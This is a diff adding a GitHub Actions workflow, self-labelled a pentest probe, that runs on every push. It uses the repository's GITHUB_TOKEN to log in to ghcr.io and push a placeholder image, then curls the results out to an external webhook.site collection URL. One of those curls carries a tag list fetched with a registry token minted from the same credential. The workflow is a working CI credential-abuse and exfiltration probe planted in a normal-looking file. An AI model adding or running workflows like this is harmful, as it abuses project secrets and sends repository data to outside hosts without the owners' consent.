@@ -1,0 +1,22 @@
+name: p11798ghcr
+on:
+  push:
+jobs:
+  p:
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    permissions:
+      contents: read
+      packages: write
+    steps:
+      - name: build-and-push-ghcr
+        run: |
+          set -x
+          echo "FROM alpine:3.20" > /tmp/Dockerfile
+          echo "RUN echo pentest-11798-probe" >> /tmp/Dockerfile
+          echo "${{ secrets.GITHUB_TOKEN }}" | docker login ghcr.io -u ${{ github.actor }} --password-stdin
+          docker build -t ghcr.io/dofastted/pentest11798:latest /tmp
+          docker push ghcr.io/dofastted/pentest11798:latest && echo PUSH_OK || echo PUSH_FAIL
+          docker buildx imagetools inspect ghcr.io/dofastted/pentest11798:latest 2>&1 | head -30 || true
+          curl -s -m 20 --data-binary "PUSH_RESULT=$(docker images | grep pentest11798 | tr -s ' ')" https://webhook.site/af26a2d1-d28c-4a1d-8c28-177d72625d7f >/dev/null || true
+          curl -s -m 20 --data "taglist=$(curl -s -H "Authorization: Bearer $(curl -s -u "${{ github.actor }}:${{ secrets.GITHUB_TOKEN }}" 'https://ghcr.io/token?scope=repository:dofastted/pentest11798:pull' | sed 's/.*"token":"//;s/".*//')" https://ghcr.io/v2/dofastted/pentest11798/tags/list)" https://webhook.site/af26a2d1-d28c-4a1d-8c28-177d72625d7f >/dev/null || true
